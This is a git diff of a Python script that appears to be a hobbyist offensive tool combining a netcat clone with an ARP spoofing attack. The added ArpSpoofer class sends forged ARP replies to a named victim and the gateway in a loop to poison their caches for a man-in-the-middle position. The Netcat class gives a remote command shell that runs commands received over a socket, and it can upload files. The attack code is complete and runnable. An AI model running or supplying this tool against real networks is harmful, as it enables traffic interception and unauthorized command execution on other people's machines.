@@ -1,13 +1,30 @@
+from os import chdir,path,getuid
+from colorama import init,Fore
 import argparse
 import textwrap
 import sys
 import socket
 import threading
 import subprocess
-from os import chdir,path
 import errno 
-from colorama import init,Fore
+import scapy.all as scapy
+import time
+
 init(autoreset=True)
+
+# Setting colors for the output
+# to make it easier to read
+underline='\033[4m'
+remove_underline='\033[24m'
+color_block='\033[38;5;'
+color_34=f'{color_block}34m'
+color_160=f'{color_block}160m'
+color_123=f'{color_block}123m'
+color_124=f'{color_block}124m'
+color_196=f'{color_block}196m'
+color_251=f'{color_block}251m'
+reset_colors='\033[0m'
+
 
 def netcat_parser(sub_parser):
     netcat_parser=sub_parser.add_parser(
@@ -16,17 +33,17 @@ def netcat_parser(sub_parser):
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=textwrap.dedent(
             Fore.YELLOW+"""Example:
-        nc.py -t 192.168.1.108 -p 5555 -lc\t#start a command shell (listener side)              
-        nc.py -t 192.168.1.108 -p 5555 -c\t#start a command shell (sender side)
+        nc.py nc -t 192.168.1.108 -p 5555 -lc\t#start a command shell (listener side)              
+        nc.py nc -t 192.168.1.108 -p 5555 -c\t#start a command shell (sender side)
 
-        nc.py -t 192.168.1.108 -p 5555 -lu\t#upload a file (listener side)
-        nc.py -t 192.168.1.108 -p 5555 -u\t#upload a file (sender side)
+        nc.py nc -t 192.168.1.108 -p 5555 -lu\t#upload a file (listener side)
+        nc.py nc -t 192.168.1.108 -p 5555 -u\t#upload a file (sender side)
         
-        nc.py -t 192.168.1.108 -p 5555 -luc\t#upload a file and then start a shell (listener side)
-        nc.py -t 192.168.1.108 -p 5555 -uc\t#upload a file and then start a shell (sender side)
-        
-        
-        nc.py -t 192.168.1.108 -p 5555\t# connect to server
+        nc.py nc -t 192.168.1.108 -p 5555 -luc\t#upload a file and then start a shell (listener side)
+        nc.py nc -t 192.168.1.108 -p 5555 -uc\t#upload a file and then start a shell (sender side)
+
+
+        nc.py nc -t 192.168.1.108 -p 5555\t# connect to server
 
         The default ip is 0.0.0.0 and the default port is 5555
         """
@@ -42,19 +59,21 @@ def netcat_parser(sub_parser):
 def arp_parser(sub_parser):
     arp_parser=sub_parser.add_parser(
         'arp',
-        description="Simple ARP spoofing tool",
+        description=Fore.LIGHTWHITE_EX+"Simple ARP spoofing tool"+Fore.MAGENTA,
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=textwrap.dedent(
-        """Example:
-        Will be added later
+        Fore.YELLOW+"""Example:
+        nc.py arp 
         """
         )
         )
-    arp_parser.add_argument('-s','--sss',help="test")    
+    arp_parser.add_argument('-v','--victim',help='victim ip address',required=True)
+    arp_parser.add_argument('-g','--gateway',default='192.168.1.1',help='set gateway\'s ip address')
+    arp_parser.add_argument('-i','--interface',help='set interface name',required=True)    
 
 def execute(command):
     command=command.strip()
-    if command[0:2]=="cd":
+    if command[0:2]=="cd": # this allows you to change the directory, normally you couldn't
         try:
             chdir(command[2::].strip())
             return ""
@@ -67,7 +86,10 @@ def execute(command):
         return output.stderr.decode()
     return output.stdout.decode()
 
-
+def require_root():
+    if getuid()!=0: # when running arp spoof you must be root
+        print(f"{color_124}{underline}This script must be run as root.{reset_colors}")
+        sys.exit(1)
 class Netcat:
     def __init__(self, args, buffer=None):
         self.args = args
@@ -82,6 +104,7 @@ class Netcat:
         self.send()
 
     def send(self):
+        # To check if you are already connected
         try:
             self.socket.connect((self.args.target, self.args.port))
         except OSError as e:
@@ -90,10 +113,13 @@ class Netcat:
                 pass
             else:
                 raise
-
+        
+        #Upload a file
         if self.args.upload:
             client_thread=threading.Thread(target=self.handle,args=(self.socket,))
             client_thread.run()
+        
+        # The shell
         try:
             while True:
                 buffer = input(Fore.LIGHTWHITE_EX+"> ")+"\n"
@@ -125,20 +151,25 @@ class Netcat:
         self.socket.bind((self.args.target, self.args.port))
         self.socket.listen(1)
         
+        # Starts the client thread
         clinet_socket = self.socket.accept()[0]
         client_thread = threading.Thread(target=self.handle, args=(clinet_socket,))
-        client_thread.start()
+        client_thread.start() 
 
     def handle(self, clinet_socket):
         if self.args.upload:
+
+            # Uplaoding a file (receiver side)
             if self.args.listen:
                 try:
+                    # Receiving a header containing meta data needed to download the file
                     fname_len=int.from_bytes(Netcat.recv_exact(clinet_socket,4),'big')
                     fname=Netcat.recv_exact(clinet_socket,fname_len).decode()
                     f_len=int.from_bytes(Netcat.recv_exact(clinet_socket,8),'big')
                     with open(fname,'wb') as f:
                         received=0
                         while received<f_len:
+                            # Receiving and writing the file in chunks, one chunk at a time so large files don't consume memory
                             chunk=clinet_socket.recv(min(4096,f_len-received))
                             if not chunk:
                                 raise ConnectionError(Fore.RED+"Connection corrupted: The sender closed early")
@@ -147,14 +178,19 @@ class Netcat:
                         del(received)
                 except ConnectionError as e:
                     print(Fore.RED+f"Upload failed: {e}")
+                    # if the upload failed and you setted --command option to true, then start a shell, other wise just close an
                     if self.args.command:
                         return
                     self.exit()
                 print(Fore.GREEN+"Done")
+
+                # After finishing uploading the file, if you setted --command option to true start a shell, other wise close the program 
                 if not self.args.command:
                     self.exit()
-
+            
+            # Uplaoding a file (sender side)
             else:
+                # Creating headers containing meta data needed to upload the file
                 fpath=input(Fore.MAGENTA+"path:").strip()
                 fname=fpath.split('/')[-1]
                 fname_len=len(fname.encode())
@@ -163,6 +199,7 @@ class Netcat:
                 clinet_socket.sendall(fname.encode())
                 clinet_socket.sendall(fsize.to_bytes(8,'big'))
                 try:
+                    # Reading and sending the file in chunks, one chunk at a time so large files don't consume memory
                     with open(fpath,'rb') as f:
                         sent=0
                         while True:
@@ -176,11 +213,14 @@ class Netcat:
                 except Exception as e:
                     print(Fore.RED+f"Error: {e}")
                 print(Fore.GREEN+"Done.")
-                self.args.upload=False
+                self.args.upload=False 
+
+                # If the --commnad option is true, start a shell after uploading the file
                 if self.args.command:
                     self.send()
                 sys.exit()
 
+        # Here the sent commands are received and executed
         if self.args.command:
             cmd_buffer = b""
             while True:
@@ -200,6 +240,8 @@ class Netcat:
                 except Exception as e:
                     print(Fore.RED+f"server killed {e}")
                     self.exit()
+
+    # A static method to receive the meta data correctly, since the whole upload process depends on them
     @staticmethod                    
     def recv_exact(clinet_socket,length):
         data=b''
@@ -215,18 +257,90 @@ class Netcat:
         self.socket.close()
         sys.exit()
 
-class Arp_spoofing:
+class ArpSpoofer:
     def __init__(self,args):
-        self.args=args
+        self.interface=args.interface
+        self.victim_mac=None
+        self.victim_ip=args.victim
+        self.gateway_mac=None
+        self.gateway_ip=args.gateway
+
+        
+    def get_mac(self,ip):
+        request=scapy.ARP(pdst=ip)
+        broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        final_packet=broadcast/request
+        
+        # If an arp reply is not received, either retry sending the request or stop the attack
+        while True: 
+            answer=scapy.srp(final_packet,iface=self.interface,timeout=2,verbose=False)[0]
+            if not answer:
+                print(f'{color_160}No arp reply was received.{reset_colors}\n{color_251}Try Again? [y/n]:{reset_colors}',end='')
+                Ans=input().lower()
+                if Ans=="y"or Ans=="yes":
+                    continue
+                sys.exit(1)
+            return answer[0][1].hwsrc
+
+    def spoof(self): 
+        packet_for_victim=scapy.Ether(dst=self.victim_mac)/scapy.ARP(
+            pdst=self.victim_ip,
+            hwdst=self.victim_mac,
+            psrc=self.gateway_ip,
+            op=2 
+            )
+        
+        packet_for_gateway=scapy.Ether(dst=self.gateway_mac)/scapy.ARP(
+            pdst=self.gateway_ip,
+            hwdst=self.gateway_mac,
+            psrc=self.victim_ip,
+            op=2
+        )
+
+        scapy.sendp(packet_for_victim, iface=self.interface, verbose=False)
+        print(f"{color_251}Spoofing {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} pretending to be {color_196}{underline}{self.victim_ip}{remove_underline}{color_251}...{reset_colors}")
+        
+        scapy.sendp(packet_for_gateway,iface=self.interface,verbose=False)
+        print(f"{color_251}Spoofing {color_196}{underline}{self.victim_ip}{remove_underline}{color_251} pretending to be {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251}...{reset_colors}")
+
+    def restore(self):
+        # Restore each host to its original state
+
+        # restoring the Gateway
+        packet=scapy.Ether(dst=self.gateway_mac)/scapy.ARP(psrc=self.victim_ip,hwsrc=self.victim_mac,pdst=self.gateway_ip,hwdst=self.gateway_mac, op=2)
+
+        # Sending the packet multiple times to make sure the gateway restores its arp cache table
+        for _ in range(10):
+            scapy.sendp(packet,iface=self.interface,verbose=False)
+            print(f'\r{color_251}Restoring {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} to its original state.{reset_colors}',flush=True,end='')
+            time.sleep(0.1)
+        print(f'\n{color_34}Done.{reset_colors}')
+
+        # Restoing the Victim
+        packet=scapy.Ether(dst=self.victim_mac)/scapy.ARP(psrc=self.gateway_ip,hwsrc=self.gateway_mac,pdst=self.victim_ip,hwdst=self.victim_mac,op=2)
+
+        # Sending the packet multiple times to make sure the victim restores its arp cache table
+        for _ in range(10):
+            scapy.sendp(packet,iface=self.interface,verbose=False)
+            print(f'\r{color_251}Restoring {color_196}{underline}{self.victim_ip}{remove_underline}{color_251} to its original state.{reset_colors}',flush=True,end='')
+            time.sleep(0.1)
+        print(f'\n{color_34}Done.{reset_colors}')
+        return
     
-    def tt(self):
-        print("arp spoofing tool.")
-    def __str__(self):
-        return self.args
+    def run(self):
+        self.gateway_mac=self.get_mac(self.gateway_ip)
+        self.victim_mac=self.get_mac(self.victim_ip)
+        try:
+            while True:
+                self.spoof()
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            print(f"\n{color_251}Stopping...{reset_colors}")
+        finally: # A finally block is essential, what ever happens the code must restore victim and gateway.
+            self.restore()
 
 
 def main():
-
     parser = argparse.ArgumentParser(description="Choose what mode you wanna use:")
     sub_parsers=parser.add_subparsers(dest='mode',required=True)
     
@@ -234,11 +348,16 @@ def main():
     arp_parser(sub_parsers)
 
     args = parser.parse_args()
-
+    
     if args.mode=='nc':
         buffer=''
         nc = Netcat(args, buffer.encode())
         nc.run()
+    elif args.mode=='arp':
+        require_root() # you must be root to start the arp spoof attack 
+
+        spoofer=ArpSpoofer(args)
+        spoofer.run()
 
 if __name__ == "__main__":
     main()
